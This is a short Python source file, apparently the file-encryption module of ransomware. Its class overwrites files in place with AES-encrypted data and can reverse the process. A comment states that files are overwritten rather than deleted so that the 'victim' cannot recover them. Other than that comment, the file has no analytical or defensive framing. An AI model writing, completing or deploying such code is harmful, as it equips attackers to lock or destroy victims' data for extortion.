import os

class CryptClass():
    def __init__(self, key: str) -> None:
        self.key = key

    def encrypt(self, filename: str, aes) -> None:
        try:
            orig_file = open(filename, "r+b")
            data_file = orig_file.read()
            
            encrypted_data = aes.encrypt(data_file)

            # Overwrite file with encrypted data (if we remove the file, victim can recover it later)
            orig_file.seek(0)
            orig_file.write(encrypted_data)
            orig_file.truncate()
            orig_file.close()
            print(f"[+] File Encrypted: {filename}")
        except Exception as e:
            print(f"[X] File Not Encrypted: {filename} | {e}")

    def decrypt(self, filename: str, aes) -> None:

        try:
            encrypted_file = open(filename, "r+b")
            encrypted_data = encrypted_file.read()

            original_data = aes.decrypt(encrypted_data)

            encrypted_file.seek(0)
            encrypted_file.write(original_data)
            encrypted_file.truncate()
            encrypted_file.close()
            print(f"[+] File Decrypted: {filename}")
        except Exception as e:
            print(f"[X] File Not Decrypted: {filename} | {e}")